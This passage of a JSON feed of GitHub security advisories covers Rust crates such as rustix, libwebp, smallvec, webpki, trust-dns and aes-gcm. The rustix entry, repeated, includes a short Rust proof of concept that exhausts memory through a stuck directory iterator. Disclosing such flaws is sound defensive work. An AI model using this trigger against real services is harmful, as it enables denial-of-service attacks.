std::fs::create_dir(\"tmp_dir\")?;\n    let dir_fd = rustix::fs::openat(\n        rustix::fs::CWD,\n        rustix::cstr!(\"tmp_dir\"),\n        rustix::fs::OFlags::RDONLY | rustix::fs::OFlags::CLOEXEC,\n        rustix::fs::Mode::empty(),\n    )?;\n    std::fs::remove_dir(\"tmp_dir\")?;\n\n    // iterator gets stuck in infinite loop and memory explodes\n    rustix::fs::Dir::read_from(dir_fd)?\n        // the iterator keeps returning `Some(Err(_))`, but never halts by returning `None`\n        // therefore if the implementation ignores the error (or otherwise continues\n        // after seeing the error instead of breaking), the loop will not halt\n        .filter_map(|dirent_maybe_error| dirent_maybe_error.ok())\n        .for_each(|dirent| {\n            // your happy path\n            println!(\"{dirent:?}\");\n        });\n\n    Ok(())\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>If a program tries to access a directory with its file descriptor after the file has been unlinked (or any other action that leaves the <code>Dir</code> iterator in the stuck state), and the implementation does not break after seeing an error, it can cause a memory explosion.</p>\n<p>As an example, Linux's various virtual file systems (e.g. <code>/proc</code>, <code>/sys</code>) can contain directories that spontaneously pop in and out of existence. Attempting to iterate over them using <code>rustix::fs::Dir</code> directly or indirectly (e.g. with the <code>procfs</code> crate) can trigger this fault condition if the implementation decides to continue on errors.</p>\n<p>An attacker knowledgeable about the implementation details of a vulnerable target can therefore try to trigger this fault condition via any one or a combination of several available APIs. If successful, the application host will quickly run out of memory, after which the application will likely be terminated by an OOM killer, leading to denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm\">https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm</a></li>\n<li><a href=\"https://github.com/imsnif/bandwhich/issues/284\">https://github.com/imsnif/bandwhich/issues/284</a></li>\n<li><a href=\"https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993\">https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159\">https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec\">https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6\">https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5\">https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5</a></li>\n<li><a href=\"https://discord.com/channels/273534239310479360/1161137828395237556\">https://discord.com/channels/273534239310479360/1161137828395237556</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c827-hfw6-qwvm\">https://github.com/advisories/GHSA-c827-hfw6-qwvm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c827-hfw6-qwvm",
            "title": "[rustix] rustix's `rustix::fs::Dir` iterator with the `linux_raw` backend can cause memory explosion",
            "date_modified": "2023-10-18T18:27:49.000Z",
            "date_published": "2023-10-18T18:27:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c827-hfw6-qwvm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When using <code>rustix::fs::Dir</code> using the <code>linux_raw</code> backend, it's possible for the iterator to \"get stuck\" when an IO error is encountered. Combined with a memory over-allocation issue in <code>rustix::fs::Dir::read_more</code>, this can cause quick and unbounded memory explosion (gigabytes in a few seconds if used on a hot path) and eventually lead to an OOM crash of the application.</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"discovery\">Discovery</h4>\n<p>The symptoms were initially discovered in <a href=\"https://github.com/imsnif/bandwhich/issues/284\">https://github.com/imsnif/bandwhich/issues/284</a>. That post has lots of details of our investigation. See <a href=\"https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993\">this post</a> and the <a href=\"https://discord.com/channels/273534239310479360/1161137828395237556\">Discord thread</a> for details.</p>\n<h4 id=\"diagnosis\">Diagnosis</h4>\n<p>This issue is caused by the combination of two independent bugs:</p>\n<ol>\n<li>Stuck iterator</li>\n</ol>\n<ul>\n<li>The <code>rustix::fs::Dir</code> iterator can fail to halt after encountering an IO error, causing the caller to be stuck in an infinite loop.</li>\n</ul>\n<ol start=\"2\">\n<li>Memory over-allocation</li>\n</ol>\n<ul>\n<li><code>Dir::read_more</code> incorrectly grows the read buffer unconditionally each time it is called, regardless of necessity.</li>\n</ul>\n<p>Since <code>&lt;Dir as Iterator&gt;::next</code> calls <code>Dir::read</code>, which in turn calls <code>Dir::read_more</code>, this means an IO error encountered during reading a directory can lead to rapid and unbounded growth of memory use.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-rust\">fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {\n    // create a directory, get a FD to it, then unlink the directory but keep the FD\n    std::fs::create_dir(\"tmp_dir\")?;\n    let dir_fd = rustix::fs::openat(\n        rustix::fs::CWD,\n        rustix::cstr!(\"tmp_dir\"),\n        rustix::fs::OFlags::RDONLY | rustix::fs::OFlags::CLOEXEC,\n        rustix::fs::Mode::empty(),\n    )?;\n    std::fs::remove_dir(\"tmp_dir\")?;\n\n    // iterator gets stuck in infinite loop and memory explodes\n    rustix::fs::Dir::read_from(dir_fd)?\n        // the iterator keeps returning `Some(Err(_))`, but never halts by returning `None`\n        // therefore if the implementation ignores the error (or otherwise continues\n        // after seeing the error instead of breaking), the loop will not halt\n        .filter_map(|dirent_maybe_error| dirent_maybe_error.ok())\n        .for_each(|dirent| {\n            // your happy path\n            println!(\"{dirent:?}\");\n        });\n\n    Ok(())\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>If a program tries to access a directory with its file descriptor after the file has been unlinked (or any other action that leaves the <code>Dir</code> iterator in the stuck state), and the implementation does not break after seeing an error, it can cause a memory explosion.</p>\n<p>As an example, Linux's various virtual file systems (e.g. <code>/proc</code>, <code>/sys</code>) can contain directories that spontaneously pop in and out of existence. Attempting to iterate over them using <code>rustix::fs::Dir</code> directly or indirectly (e.g. with the <code>procfs</code> crate) can trigger this fault condition if the implementation decides to continue on errors.</p>\n<p>An attacker knowledgeable about the implementation details of a vulnerable target can therefore try to trigger this fault condition via any one or a combination of several available APIs. If successful, the application host will quickly run out of memory, after which the application will likely be terminated by an OOM killer, leading to denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm\">https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm</a></li>\n<li><a href=\"https://github.com/imsnif/bandwhich/issues/284\">https://github.com/imsnif/bandwhich/issues/284</a></li>\n<li><a href=\"https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993\">https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159\">https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec\">https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6\">https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6</a></li>\n<li><a href=\"https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5\">https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5</a></li>\n<li><a href=\"https://discord.com/channels/273534239310479360/1161137828395237556\">https://discord.com/channels/273534239310479360/1161137828395237556</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c827-hfw6-qwvm\">https://github.com/advisories/GHSA-c827-hfw6-qwvm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c827-hfw6-qwvm",
            "title": "[rustix] rustix's `rustix::fs::Dir` iterator with the `linux_raw` backend can cause memory explosion",
            "date_modified": "2023-10-18T18:27:49.000Z",
            "date_published": "2023-10-18T18:27:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c827-hfw6-qwvm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in the sized-chunks crate through 0.6.2 for Rust. In the Chunk implementation, the array size is not checked when constructed with pair().</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-25792\">https://nvd.nist.gov/vuln/detail/CVE-2020-25792</a></li>\n<li><a href=\"https://github.com/bodil/sized-chunks/issues/11\">https://github.com/bodil/sized-chunks/issues/11</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2020-0041.html\">https://rustsec.org/advisories/RUSTSEC-2020-0041.html</a></li>\n<li><a href=\"https://github.com/bodil/sized-chunks/commit/3ae48bd463c1af41c24b96b84079946f51f51e3c\">https://github.com/bodil/sized-chunks/commit/3ae48bd463c1af41c24b96b84079946f51f51e3c</a></li>\n<li><a href=\"https://github.com/bodil/sized-chunks/commit/99e593c3037438db478256a1f3101371a69cbd3f\">https://github.com/bodil/sized-chunks/commit/99e593c3037438db478256a1f3101371a69cbd3f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mp6f-p9gp-vpj9\">https://github.com/advisories/GHSA-mp6f-p9gp-vpj9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mp6f-p9gp-vpj9",
            "title": "[sized-chunks] Array size is not checked in sized-chunks",
            "date_modified": "2023-10-10T19:27:06.000Z",
            "date_published": "2021-08-25T20:46:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mp6f-p9gp-vpj9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Heap buffer overflow in libwebp allow a remote attacker to perform an out of bounds memory write via a crafted HTML page. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-4863\">https://nvd.nist.gov/vuln/detail/CVE-2023-4863</a></li>\n<li><a href=\"https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_11.html\">https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_11.html</a></li>\n<li><a href=\"https://crbug.com/1479274\">https://crbug.com/1479274</a></li>\n<li><a href=\"https://github.com/qnighy/libwebp-sys2-rs/pull/21\">https://github.com/qnighy/libwebp-sys2-rs/pull/21</a></li>\n<li><a href=\"https://github.com/qnighy/libwebp-sys2-rs/commit/4560c473a76ec8bd8c650f19ddf9d7a44f719f8b\">https://github.com/qnighy/libwebp-sys2-rs/commit/4560c473a76ec8bd8c650f19ddf9d7a44f719f8b</a></li>\n<li><a href=\"https://github.com/webmproject/libwebp/commit/902bc9190331343b2017211debcec8d2ab87e17a\">https://github.com/webmproject/libwebp/commit/902bc9190331343b2017211debcec8d2ab87e17a</a></li>\n<li><a href=\"https://bugzilla.suse.com/show_bug.cgi?id=1215231\">https://bugzilla.suse.com/show_bug.cgi?id=1215231</a></li>\n<li><a href=\"https://en.bandisoft.com/honeyview/history/\">https://en.bandisoft.com/honeyview/history/</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-4863\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-4863</a></li>\n<li><a href=\"https://news.ycombinator.com/item?id=37478403\">https://news.ycombinator.com/item?id=37478403</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0060.html\">https://rustsec.org/advisories/RUSTSEC-2023-0060.html</a></li>\n<li><a href=\"https://security-tracker.debian.org/tracker/CVE-2023-4863\">https://security-tracker.debian.org/tracker/CVE-2023-4863</a></li>\n<li><a href=\"https://stackdiary.com/critical-vulnerability-in-webp-codec-cve-2023-4863/\">https://stackdiary.com/critical-vulnerability-in-webp-codec-cve-2023-4863/</a></li>\n<li><a href=\"https://www.bleepingcomputer.com/news/google/google-fixes-another-chrome-zero-day-bug-exploited-in-attacks/\">https://www.bleepingcomputer.com/news/google/google-fixes-another-chrome-zero-day-bug-exploited-in-attacks/</a></li>\n<li><a href=\"https://www.mozilla.org/en-US/security/advisories/mfsa2023-40/\">https://www.mozilla.org/en-US/security/advisories/mfsa2023-40/</a></li>\n<li><a href=\"https://github.com/electron/electron/pull/39823\">https://github.com/electron/electron/pull/39823</a></li>\n<li><a href=\"https://github.com/electron/electron/pull/39825\">https://github.com/electron/electron/pull/39825</a></li>\n<li><a href=\"https://github.com/electron/electron/pull/39826\">https://github.com/electron/electron/pull/39826</a></li>\n<li><a href=\"https://github.com/electron/electron/pull/39827\">https://github.com/electron/electron/pull/39827</a></li>\n<li><a href=\"https://github.com/electron/electron/pull/39828\">https://github.com/electron/electron/pull/39828</a></li>\n<li><a href=\"https://adamcaudill.com/2023/09/14/whose-cve-is-it-anyway/\">https://adamcaudill.com/2023/09/14/whose-cve-is-it-anyway/</a></li>\n<li><a href=\"https://github.com/webmproject/libwebp/releases/tag/v1.3.2\">https://github.com/webmproject/libwebp/releases/tag/v1.3.2</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2023/09/msg00015.html\">https://lists.debian.org/debian-lts-announce/2023/09/msg00015.html</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2023/09/msg00016.html\">https://lists.debian.org/debian-lts-announce/2023/09/msg00016.html</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2023/09/msg00017.html\">https://lists.debian.org/debian-lts-announce/2023/09/msg00017.html</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6T655QF7CQ3DYAMPFV7IECQYGDEUIVVT/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6T655QF7CQ3DYAMPFV7IECQYGDEUIVVT/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FYYKLG6CRGEDTNRBSU26EEWAO6D6U645/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FYYKLG6CRGEDTNRBSU26EEWAO6D6U645/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OZDGWWMJREPAGKWCJKSCM4WYLANSKIFX/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OZDGWWMJREPAGKWCJKSCM4WYLANSKIFX/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PYZV7TMKF4QHZ54SFJX54BDN52VHGGCX/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PYZV7TMKF4QHZ54SFJX54BDN52VHGGCX/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WHOLML7N2G5KCAZXFWC5IDFFHSQS5SDB/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WHOLML7N2G5KCAZXFWC5IDFFHSQS5SDB/</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0061.html\">https://rustsec.org/advisories/RUSTSEC-2023-0061.html</a></li>\n<li><a href=\"https://security.gentoo.org/glsa/202309-05\">https://security.gentoo.org/glsa/202309-05</a></li>\n<li><a href=\"https://www.debian.org/security/2023/dsa-5496\">https://www.debian.org/security/2023/dsa-5496</a></li>\n<li><a href=\"https://www.debian.org/security/2023/dsa-5497\">https://www.debian.org/security/2023/dsa-5497</a></li>\n<li><a href=\"https://www.debian.org/security/2023/dsa-5498\">https://www.debian.org/security/2023/dsa-5498</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KUQ7CTX3W372X3UY56VVNAHCH6H2F4X3/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KUQ7CTX3W372X3UY56VVNAHCH6H2F4X3/</a></li>\n<li><a href=\"https://blog.isosceles.com/the-webp-0day/\">https://blog.isosceles.com/the-webp-0day/</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/09/21/4\">http://www.openwall.com/lists/oss-security/2023/09/21/4</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/09/22/1\">http://www.openwall.com/lists/oss-security/2023/09/22/1</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/09/22/3\">http://www.openwall.com/lists/oss-security/2023/09/22/3</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/09/22/4\">http://www.openwall.com/lists/oss-security/2023/09/22/4</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/09/22/5\">http://www.openwall.com/lists/oss-security/2023/09/22/5</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/09/22/6\">http://www.openwall.com/lists/oss-security/2023/09/22/6</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/09/22/7\">http://www.openwall.com/lists/oss-security/2023/09/22/7</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/09/22/8\">http://www.openwall.com/lists/oss-security/2023/09/22/8</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/09/26/1\">http://www.openwall.com/lists/oss-security/2023/09/26/1</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/09/26/7\">http://www.openwall.com/lists/oss-security/2023/09/26/7</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/09/28/1\">http://www.openwall.com/lists/oss-security/2023/09/28/1</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/09/28/2\">http://www.openwall.com/lists/oss-security/2023/09/28/2</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/09/28/4\">http://www.openwall.com/lists/oss-security/2023/09/28/4</a></li>\n<li><a href=\"https://github.com/jaredforth/webp/pull/30\">https://github.com/jaredforth/webp/pull/30</a></li>\n<li><a href=\"https://github.com/python-pillow/Pillow/pull/7395\">https://github.com/python-pillow/Pillow/pull/7395</a></li>\n<li><a href=\"https://github.com/jaredforth/webp/commit/9d4c56e63abecc777df71c702503c3eaabd7dcbc\">https://github.com/jaredforth/webp/commit/9d4c56e63abecc777df71c702503c3eaabd7dcbc</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WTRUIS3564P7ZLM2S2IH4Y4KZ327LI4I/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WTRUIS3564P7ZLM2S2IH4Y4KZ327LI4I/</a></li>\n<li><a href=\"https://pillow.readthedocs.io/en/stable/releasenotes/10.0.1.html#security\">https://pillow.readthedocs.io/en/stable/releasenotes/10.0.1.html#security</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20230929-0011/\">https://security.netapp.com/advisory/ntap-20230929-0011/</a></li>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/discussions/6664\">https://github.com/ImageMagick/ImageMagick/discussions/6664</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/13.3.0\">https://github.com/dlemstra/Magick.NET/releases/tag/13.3.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j7hp-h8jx-5ppr\">https://github.com/advisories/GHSA-j7hp-h8jx-5ppr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j7hp-h8jx-5ppr",
            "title": "[webp] libwebp: OOB write in BuildHuffmanTable",
            "date_modified": "2023-11-05T05:01:18.000Z",
            "date_published": "2023-09-12T15:30:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j7hp-h8jx-5ppr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Affected versions of this crate called mem::uninitialized() to create values of a user-supplied type T. This is unsound e.g. if T is a reference type (which must be non-null and thus may not remain uninitialized). The flaw was corrected by avoiding the use of mem::uninitialized(), using MaybeUninit instead.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-25023\">https://nvd.nist.gov/vuln/detail/CVE-2018-25023</a></li>\n<li><a href=\"https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/smallvec/RUSTSEC-2018-0018.md\">https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/smallvec/RUSTSEC-2018-0018.md</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2018-0018.html\">https://rustsec.org/advisories/RUSTSEC-2018-0018.html</a></li>\n<li><a href=\"https://github.com/servo/rust-smallvec/issues/126\">https://github.com/servo/rust-smallvec/issues/126</a></li>\n<li><a href=\"https://github.com/servo/rust-smallvec/pull/162\">https://github.com/servo/rust-smallvec/pull/162</a></li>\n<li><a href=\"https://github.com/servo/rust-smallvec/commit/e64afc8c473d43e375ab42bd33db2d0d4ac4e41b\">https://github.com/servo/rust-smallvec/commit/e64afc8c473d43e375ab42bd33db2d0d4ac4e41b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-55m5-whcv-c49c\">https://github.com/advisories/GHSA-55m5-whcv-c49c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-55m5-whcv-c49c",
            "title": "[smallvec] Use of Uninitialized Resource in smallvec",
            "date_modified": "2023-10-02T23:32:50.000Z",
            "date_published": "2022-01-06T22:20:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-55m5-whcv-c49c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>When this crate is given a pathological certificate chain to validate, it will spend CPU time exponential with the number of candidate certificates at each step of path building.</p>\n<p>Both TLS clients and TLS servers that accept client certificate are affected.</p>\n<p>This was previously reported in <a href=\"https://github.com/briansmith/webpki/issues/69\">https://github.com/briansmith/webpki/issues/69</a>.</p>\n<p><code>rustls-webpki</code> is a fork of this crate which contains a fix for this issue and is actively maintained.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/crypto-com/sgx-vendor\">https://github.com/crypto-com/sgx-vendor</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0052.html\">https://rustsec.org/advisories/RUSTSEC-2023-0052.html</a></li>\n<li><a href=\"https://github.com/briansmith/webpki/issues/69\">https://github.com/briansmith/webpki/issues/69</a></li>\n<li><a href=\"https://github.com/briansmith/webpki/issues/69#issuecomment-1699894848\">https://github.com/briansmith/webpki/issues/69#issuecomment-1699894848</a></li>\n<li><a href=\"https://github.com/briansmith/webpki/commit/30a108e0802fd09585e0d071013f24b8272d139b\">https://github.com/briansmith/webpki/commit/30a108e0802fd09585e0d071013f24b8272d139b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8qv2-5vq6-g2g7\">https://github.com/advisories/GHSA-8qv2-5vq6-g2g7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8qv2-5vq6-g2g7",
            "title": "[webpki] webpki: CPU denial of service in certificate path building",
            "date_modified": "2023-10-02T21:02:45.000Z",
            "date_published": "2023-08-25T00:12:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8qv2-5vq6-g2g7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There's a stack overflow leading to a crash and potential DOS when processing additional records for return of MX or SRV record types from the server. This is only possible when a zone is configured with a null target for MX or SRV records. Prior to 0.16.0 the additional record processing was not supported by trust-dns-server. There Are no known issues with upgrading from 0.16 or 0.17 to 0.18.1. The remidy should be to upgrade to 0.18.1. If unable to do so, MX, SRV or other record types with a target to the null type, should be avoided.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-35857\">https://nvd.nist.gov/vuln/detail/CVE-2020-35857</a></li>\n<li><a href=\"https://github.com/bluejekyll/trust-dns/issues/980\">https://github.com/bluejekyll/trust-dns/issues/980</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2020-0001.html\">https://rustsec.org/advisories/RUSTSEC-2020-0001.html</a></li>\n<li><a href=\"https://github.com/bluejekyll/trust-dns/pull/982\">https://github.com/bluejekyll/trust-dns/pull/982</a></li>\n<li><a href=\"https://github.com/bluejekyll/trust-dns/commit/8b9eab05795fdc098976262853b2498055c7a8f3\">https://github.com/bluejekyll/trust-dns/commit/8b9eab05795fdc098976262853b2498055c7a8f3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4cww-f7w5-x525\">https://github.com/advisories/GHSA-4cww-f7w5-x525</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4cww-f7w5-x525",
            "title": "[trust-dns-server] Stack consumption in trust-dns-server",
            "date_modified": "2023-10-02T20:26:29.000Z",
            "date_published": "2021-08-25T20:46:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4cww-f7w5-x525"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The From implementation for Vec was not properly implemented, returning a vector backed by freed memory. This could lead to memory corruption or be exploited to cause undefined behavior.</p>\n<p>A fix was published in version 0.1.3.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-16140\">https://nvd.nist.gov/vuln/detail/CVE-2019-16140</a></li>\n<li><a href=\"https://github.com/sagebind/isahc/issues/2\">https://github.com/sagebind/isahc/issues/2</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2019-0016.html\">https://rustsec.org/advisories/RUSTSEC-2019-0016.html</a></li>\n<li><a href=\"https://github.com/sagebind/isahc/commit/9e9f1fb44114078c000c78c72e691eeb9e7ac260\">https://github.com/sagebind/isahc/commit/9e9f1fb44114078c000c78c72e691eeb9e7ac260</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5rrv-m36h-qwf8\">https://github.com/advisories/GHSA-5rrv-m36h-qwf8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5rrv-m36h-qwf8",
            "title": "[chttp] Use-after-free in chttp",
            "date_modified": "2023-10-02T16:41:55.000Z",
            "date_published": "2021-08-25T20:44:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5rrv-m36h-qwf8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Affected versions of borsh cause undefined behavior when zero-sized-types (ZST) are parsed and the Copy/Clone traits are not implemented/derived. For instance if 1000 instances of a ZST are deserialized, and the ZST is not copy (this can be achieved through a singleton), then accessing/writing to deserialized data will cause a segmentation fault.</p>\n<p>There is currently no way for borsh to read data without also providing a Rust type. Therefore, if you are not using ZST for serialization, then you are not affected by this issue. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/near/borsh-rs/issues/19\">https://github.com/near/borsh-rs/issues/19</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0033.html\">https://rustsec.org/advisories/RUSTSEC-2023-0033.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fjx5-qpf4-xjf2\">https://github.com/advisories/GHSA-fjx5-qpf4-xjf2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fjx5-qpf4-xjf2",
            "title": "[borsh] Parsing borsh messages with ZST which are not-copy/clone is unsound",
            "date_modified": "2023-09-29T18:12:12.000Z",
            "date_published": "2023-04-17T16:32:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fjx5-qpf4-xjf2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>In the AES GCM implementation of decrypt_in_place_detached, the decrypted ciphertext (i.e. the correct plaintext) is exposed even if tag verification fails. </p>\n<h3 id=\"impact\">Impact</h3>\n<p>If a program using the <code>aes-gcm</code> crate's <code>decrypt_in_place*</code> APIs accesses the buffer after decryption failure, it will contain a decryption of an unauthenticated input. Depending on the specific nature of the program this may enable Chosen Ciphertext Attacks (CCAs) which can cause a catastrophic breakage of the cipher including full plaintext recovery.</p>\n<h3 id=\"details\">Details</h3>\n<p>As seen in the implementation of <a href=\"https://docs.rs/aes-gcm/latest/src/aes_gcm/lib.rs.html#309\">decrypt_in_place_detached</a> for AES GCM, if the tag verification fails, an error is returned. Because the decryption of the ciphertext is done in place, the plaintext contents are now exposed via <code>buffer</code>. </p>\n<p>This should ideally not be the case - as noted in page 17 of<a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf\"> NIST's publication <em>Recommendation for Block Cipher Modes of Operation: Galois/Counter Mode (GCM) and GMAC</em></a>: \n<em>In Step 8, the result of Step 7 is compared with the authentication tag that was received as an input: if they are identical, then the plaintext is returned; otherwise,FAIL is returned.</em></p>\n<p>This is seems correctly addressed in the <a 